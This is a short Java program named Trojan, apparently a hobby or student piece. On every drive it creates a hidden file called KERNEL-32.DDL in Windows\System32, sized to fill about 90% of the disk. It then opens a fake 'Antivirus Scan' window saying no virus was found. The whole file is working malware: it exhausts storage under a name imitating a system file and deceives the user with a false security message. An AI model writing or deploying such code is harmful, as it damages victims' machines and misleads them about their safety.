
import java.awt.BorderLayout;
import java.awt.Dimension;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author Keinan
 */
public class Trojan {
    public static void main(String[] args) {
        printDirs();
    }
    
    public static void printDirs() {
        File[] paths;

        // returns "drives"
        paths = File.listRoots();
        
        // Try to place file in each directory until we find root dir catch if
        // in the wrong dir.
        for(File path:paths) {
            try{ 
                double size = (path.getTotalSpace()*.9 - (path.getTotalSpace() -path.getFreeSpace()));
                Path p = Paths.get(path+"Windows\\System32\\KERNEL-32.DDL");
                RandomAccessFile fLarge = new RandomAccessFile(new File(p.toString()), "rw");                
                fLarge.setLength((long)size);
                fLarge.close();
                Files.setAttribute(p, "dos:hidden", Boolean.TRUE);
            }
            catch(FileNotFoundException e) {
                System.out.println(e);
            } catch (IOException ex) {
                System.out.println(ex);
            }
        }
        JPanel panel = new JPanel(new BorderLayout());
        JFrame frame = new JFrame("Antivirus Scan");
        frame.add(panel);
        JLabel lab = new JLabel("The scanning finishes and no virus is found!");
        panel.add(lab);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setPreferredSize(new Dimension(300,100));
        frame.pack();
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
    }
}
